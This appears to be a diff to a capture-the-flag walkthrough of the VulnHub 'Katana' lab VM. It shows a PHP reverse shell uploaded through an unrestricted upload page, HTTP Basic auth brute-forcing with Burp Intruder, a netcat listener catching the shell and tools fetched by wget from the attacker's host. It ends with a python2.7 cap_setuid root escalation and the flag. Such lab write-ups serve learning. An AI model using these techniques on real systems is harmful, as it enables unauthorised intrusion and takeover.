@@ -6,7 +6,7 @@ I must go from visiting a simple website to having root access over the entire w
 
 I downloaded the VM from [here](https://www.vulnhub.com/entry/katana-1,482/) and set it up with VMware Workstation Pro 16.
 
-## Step 1 - Reconnaissance
+## Step 1 & 2 - Reconnaissance & Exploitation
 
 First I find my IP address and run an Nmap scan to identify the target.
 
@@ -270,3 +270,211 @@ Found: [Status=200] [Length=6480] http://192.168.57.140:8088/upload.html
 Investigations of the ```upload.html``` page revealed a file uploading feature, with seemingly no restrictions on what could be uploaded.
 
 ![image](https://user-images.githubusercontent.com/45502375/179552793-e7e06f52-73f6-4372-b685-50a1fe87da05.png)
+
+So I did the obvious thing and uploaded a PHP reverse shell script. It worked and even gave me the absolute path to the file of ```/opt/manager/html/katana_catshell.php```, although I didn't exactly know where this was yet.
+
+![image](https://user-images.githubusercontent.com/45502375/179553046-3bd2e765-536d-464a-b876-0c10ca767c0c.png)
+
+However, given that the folder my reverse shell was in was called ```html```, I assumed it was on one of the other webpages, and I had a feeling I knew which one it was.
+
+To be thorough, I ran another Gobuster scan on port 8088 for directories too and it revealed a ```/protected/``` folder.
+
+```
+$ sudo gobuster fuzz -u http://192.168.57.140:8088/FUZZ/ -w seclists/Discovery/Web-Content/raft-large-words.txt -b 404,403
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.57.140:8088/FUZZ/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                seclists/Discovery/Web-Content/raft-large-words.txt
+[+] Excluded Status codes:   403,404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/18 12:05:03 Starting gobuster in fuzzing mode
+===============================================================
+Found: [Status=200] [Length=5472] http://192.168.57.140:8088/docs/
+Found: [Status=200] [Length=655] http://192.168.57.140:8088/./    
+Found: [Status=401] [Length=1242] http://192.168.57.140:8088/protected/
+                                                                       
+===============================================================
+2022/07/18 12:05:15 Finished
+===============================================================
+```
+
+Using Burp Suite, I captured the GET request to access the directory and tried the credentials ```admin:admin``` again, but they didn't seem to work.
+
+```
+GET /protected/ HTTP/1.1
+Host: 192.168.57.140:8088
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Authorization: Basic YWRtaW46YWRtaW4=
+```
+
+HTTP Basic Authentication takes credentials in a ```user:pass``` format and Base64 encodes them in the GET request, so I tried the following.
+
+- I sent the request to the Intruder and set payload positioners around ```YWRtaW46YWRtaW4=```, the credentials in the ```Authorization``` header.
+
+![image](https://user-images.githubusercontent.com/45502375/179562052-eeaba28b-ff92-42c4-9357-804f26454c42.png)
+
+- I set up a Simple list payload with common passwords from various wordlists to be used.
+
+![image](https://user-images.githubusercontent.com/45502375/179562188-bd23d75a-d328-4759-90d0-9023fb26e638.png)
+
+- I added a modifier to add an ```admin:``` prefix, since the list was only providing passwords, and then added a Base64-encoding modifier as well.
+
+![image](https://user-images.githubusercontent.com/45502375/179562294-61df063a-5d36-4f1f-9128-0903d756d8ca.png)
+
+With this, I tried brute-forcing the login for a couple of minutes, to no avail...
+
+![image](https://user-images.githubusercontent.com/45502375/179562507-1e9e3369-22a5-49a5-a78f-1b458b296e1b.png)
+
+So I moved on from this folder and went to the other password-protected site instead: ```http://192.168.57.140:8715```.
+
+There was no brute-forcing required, since that was handled beforehand in the Nmap scanning and determined to be ```admin:admin```.
+
+Logging in didn't reveal much, and neither did a Gobuster or Nikto scan of this page.
+
+I tried accessing my reverse shell script, since the previously mentioned ```upload.html``` page indicated the file was in another ```/html/``` folder, and given that its parent directory is ```/manager/```, I had hoped that such a "manager" would be behind an authentication wall.
+
+To my surprise, this worked.
+
+Going to ```http://192.168.57.140:8715/katana_catshell.php``` revealed the following:
+
+![image](https://user-images.githubusercontent.com/45502375/179563259-d17a0562-4f67-4952-b004-fbe2fbc9810d.png)
+
+So I tried again, this time with a Netcat listener running on port 4444, and I was able to gain access to the target.
+
+```
+$ sudo nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [192.168.57.129] from (UNKNOWN) [192.168.57.140] 53810
+Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
+ 12:59:07 up  2:13,  0 users,  load average: 0.04, 0.03, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+## Step 3 - Privilege Escalation
+
+Now that I had a foothold in the server, I could focus on upgrading to root.
+
+I upgraded to a TTY shell.
+
+```
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@katana:/$ ^Z
+zsh: suspended  sudo nc -lvnp 4444
+
+┌──(meowmycks㉿catBook-Air)-[~]
+└─$ stty raw -echo;fg  
+[1]  + continued  sudo nc -lvnp 4444
+
+www-data@katana:/$ export TERM=xterm
+www-data@katana:/$
+```
+
+I went to the ```/tmp``` folder to download enumeration scripts that would give me some insight into how I could perform privilege escalation on the target.
+
+```
+www-data@katana:/$ cd tmp
+www-data@katana:/tmp$
+```
+
+I started an HTTP server on my Kali box with Python using the command ```sudo python3 -m http.server 80```, allowing me to download my scripts from the target machine using ```wget``` requests.
+
+```
+sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+I then downloaded a local copy of Linux Smart Enumeration (LSE) onto the target machine.
+
+LSE allows me to scan the host for common privilege escalation points and some additional known vulnerabilities.
+
+Kali
+```
+192.168.57.140 - - [18/Jul/2022 13:05:45] "GET /lse.tar HTTP/1.1" 200 -
+```
+Target:
+```
+www-data@katana:/tmp$ wget http://192.168.57.129/lse.tar
+
+wget http://192.168.57.129/lse.tar
+--2022-07-18 13:05:45--  http://192.168.57.129/lse.tar
+Connecting to 192.168.57.129:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 24565760 (23M) [application/x-tar]
+Saving to: ‘lse.tar’
+
+lse.tar             100%[===================>]  23.43M  47.8MB/s    in 0.5s    
+
+2022-07-18 13:05:46 (47.8 MB/s) - ‘lse.tar’ saved [24565760/24565760]
+
+www-data@katana:/tmp$
+```
+
+Running the script presented hashes in the ```/etc/passwd``` file for users ```root``` and ```katana```.
+
+They were Unix SHA-512 hashes, indicated by the ```$6$``` prefixes, but I wasn't about to spend half an hour messing with them in hashcat just yet.
+
+Some other interesting things noticed were binaries with the SETUID bit, cron jobs, and binaries with capabilities, among other things.
+
+More crucially, there was a privilege escalation opportunity present in the binaries with capabilities.
+
+```
+www-data@katana:/tmp/lse$ getcap -r / 2>/dev/null
+
+getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/python2.7 = cap_setuid+ep
+```
+
+The application ```/usr/bin/python2.7``` had ```+ep``` capabilities, which would allow the privilege escalation to take place.
+
+Using GTFOBins' documentation found [here](https://gtfobins.github.io/gtfobins/python/#capabilities), we can use the following payload to elevate to a root shell.
+
+![image](https://user-images.githubusercontent.com/45502375/179566709-008c67d7-0c3b-41e2-a8d6-2248e747122c.png)
+
+So I performed the privilege escalation and was able to become root.
+
+```
+www-data@katana:/tmp/lse$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# whoami
+whoami
+root
+#
+```
+
+I then went to ```/root``` and obtained the flag.
+
+```
+# cd /root
+cd /root
+# ls         
+ls
+root.txt
+# cat root.txt
+cat root.txt
+{R00t_key_Katana_91!}
+#
+```
+
+## Conclusion
+
+This one was more difficult than the others I've experienced, which is probably a good thing. Becoming more prepared entails tackling harder challenges.
+
+The presence of several different web servers threw me off and I was stuck on the initial "CSE Bookstore" and "/protected/ folder" rabbit holes for a while, but I was inevitably able to overcome them.
+
+Here's expecting I can use these learning experiences well in the future.
